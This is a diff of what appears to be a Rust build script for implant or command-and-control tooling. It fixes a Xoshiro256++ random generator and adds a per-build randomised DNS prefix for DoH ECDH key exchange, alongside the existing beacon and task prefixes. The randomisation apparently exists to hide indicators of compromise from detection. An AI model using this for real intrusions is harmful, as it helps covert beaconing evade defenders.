@@ -38,16 +38,20 @@ impl Xoshiro256 {
     }
 
     fn next(&mut self) -> u64 {
-        let result = self.s[0]
-            .wrapping_add(self.s[3])
-            .wrapping_add(self.s[1] << 17);
-        let t = self.s[1] << 9;
+        // Xoshiro256++ reference:
+        //   result = rotl(s[0] + s[3], 23) + s[0]
+        //   t = s[1] << 17
+        //   s[2] ^= s[0]; s[3] ^= s[1]; s[1] ^= s[2]; s[0] ^= s[3]
+        //   s[2] ^= t; s[3] = rotl(s[3], 45)
+        let rot_result = (self.s[0].wrapping_add(self.s[3])).rotate_left(23);
+        let result = rot_result.wrapping_add(self.s[0]);
+        let t = self.s[1] << 17;
         self.s[2] ^= self.s[0];
         self.s[3] ^= self.s[1];
         self.s[1] ^= self.s[2];
         self.s[0] ^= self.s[3];
         self.s[2] ^= t;
-        self.s[3] = self.s[3].rotate_left(11);
+        self.s[3] = self.s[3].rotate_left(45);
         result
     }
 
@@ -120,6 +124,7 @@ fn main() {
     let service_prefix = derive_ioc_string(&mut rng, b"ioc_service_prefix", 4, true);
     let dns_beacon_prefix = derive_ioc_string(&mut rng, b"ioc_dns_beacon", 8, false);
     let dns_task_prefix = derive_ioc_string(&mut rng, b"ioc_dns_task", 8, false);
+    let dns_ecdh_prefix = derive_ioc_string(&mut rng, b"ioc_dns_ecdh", 8, false);
 
     let code = format!(
         "/// Auto-generated IoC strings — DO NOT EDIT.\n\
@@ -135,7 +140,9 @@ fn main() {
          /// DNS query prefix for DoH beacon requests (replaces \"beacon\").\n\
          pub const IOC_DNS_BEACON: &str = \"{dns_beacon_prefix}\";\n\n\
          /// DNS query prefix for DoH task requests (replaces \"task\").\n\
-         pub const IOC_DNS_TASK: &str = \"{dns_task_prefix}\";\n"
+         pub const IOC_DNS_TASK: &str = \"{dns_task_prefix}\";\n\n\
+         /// DNS query prefix for DoH ECDH key exchange.\n\
+         pub const IOC_DNS_ECDH: &str = \"{dns_ecdh_prefix}\";\n"
     );
 
     fs::write(&dest_path, code).expect("failed to write ioc_strings.rs");
